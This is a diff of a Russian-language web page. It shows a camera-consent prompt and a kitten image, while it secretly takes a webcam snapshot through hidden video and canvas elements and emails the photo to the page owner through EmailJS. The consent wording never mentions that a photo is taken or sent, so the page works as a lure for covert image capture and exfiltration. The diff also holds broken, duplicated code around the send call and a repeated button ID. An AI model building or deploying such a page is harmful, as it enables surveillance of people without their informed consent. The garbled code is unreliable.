@@ -1,46 +1,96 @@
-<script>
-  // Инициализация EmailJS
-  emailjs.init("4PEicIHTtAabJqfD1"); // твой Public Key
-
-  const agreement = document.getElementById('agreement');
-  const main = document.getElementById('main');
-  const result = document.getElementById('result');
-  const acceptBtn = document.getElementById('acceptBtn');
-  const video = document.getElementById('video');
-  const canvas = document.getElementById('canvas');
-
-  acceptBtn.onclick = async function() {
-    agreement.style.display = 'none';
-    main.style.display = 'block';
-
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      video.srcObject = stream;
-
-      // Даем камере фокусироваться
-      await new Promise(resolve => setTimeout(resolve, 1200));
-
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      // Останавливаем камеру
-      stream.getTracks().forEach(track => track.stop());
-
-      // Уменьшаем качество, чтобы письмо отправилось
-      const dataUrl = canvas.toDataURL('image/jpeg', 0.4);
-
-      // Отправляем фото в EmailJS
-      await emailjs.send("service_zv13ydk", "template_60nz82p", {
-        time: new Date().toLocaleString(),
-        photo_link: dataUrl // имя совпадает с {{photo_link}} в шаблоне EmailJS
-      });
-
-      console.log("Фото успешно отправлено!");
-      main.style.display = 'none';
-      result.style.display = 'block';
-    } catch (err) {
-      alert("Ошибка: " + err.message);
-      console.error(err);
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Фото с камеры</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
+  <style>
+    #agreement { 
+      background: #f3f3f3; 
+      border: 1px solid #aaa; 
+      padding: 20px; 
+      width: 340px; 
+      margin: 40px auto;
+      border-radius: 10px;
+      font-size: 16px;
+      text-align: center;
     }
-  };
-</script>
+    #main, #result { display: none; text-align:center; }
+    #catimg { width:320px; height:240px; border:1px solid #ccc; }
+    #loading { font-size: 18px; }
+    video { display:none; }
+    canvas { display:none; }
+    button { background:green;color:white;padding:10px 20px;font-size:18px; cursor:pointer; }
+  </style>
+</head>
+<body>
+  <div id="agreement">
+    <h2>Соглашение</h2>
+    <p>Переходя далее, вы соглашаетесь с использованием вашей камеры.</p>
+    <button id="acceptBtn" style="background:green;color:white;padding:10px 20px;font-size:18px;">Принять</button>
+    <button id="acceptBtn">Принять</button>
+  </div>
+
+  <div id="main">
+    <p id="loading">Загрузка...</p>
+    <img id="catimg" src="https://placekitten.com/320/240" alt="Котик">
+  </div>
+
+  <div id="result">
+    <h2>Спасибо!</h2>
+    <p>Фото отправлено.</p>
+    <img src="https://placekitten.com/320/240" width="320" height="240" style="border:1px solid #ccc;">
+  </div>
+
+  <video id="video" autoplay playsinline width="320" height="240"></video>
+  <canvas id="canvas" width="320" height="240"></canvas>
+
+  <script>
+    // Инициализация EmailJS
+    emailjs.init("4PEicIHTtAabJqfD1"); // твой Public Key
+
+    const agreement = document.getElementById('agreement');
+    const main = document.getElementById('main');
+    const result = document.getElementById('result');
+    const acceptBtn = document.getElementById('acceptBtn');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    acceptBtn.onclick = async function() {
+      agreement.style.display = 'none';
+      main.style.display = 'block';
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        // Ждём 1.2 секунды, чтобы камера фокуснулась
+        await new Promise(resolve => setTimeout(resolve, 1200));
+
+        // Делаем фото
+        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+        stream.getTracks().forEach(track => track.stop()); // выключаем камеру
+
+        const dataUrl = canvas.toDataURL('image/png');
+
+        // Отправляем base64 в EmailJS
+        await emailjs.send("service_zv13ydk", "template_60nz82p", {
+          time: new Date().toLocaleString(),
+          photo: dataUrl // используем переменную {{photo}} в шаблоне
+        });
+          photo: dataUrl
+        })
+        .then(response => console.log("Письмо успешно отправлено:", response))
+        .catch(error => console.error("Ошибка отправки:", error));
+
+        main.style.display = 'none';
+        result.style.display = 'block';
+      } catch(err) {
+        alert("Ошибка: " + err.message);
+        alert("Ошибка доступа к камере: " + err.message);
+        console.error(err);
+      }
+    };
+  </script>
+</body>
+</html>
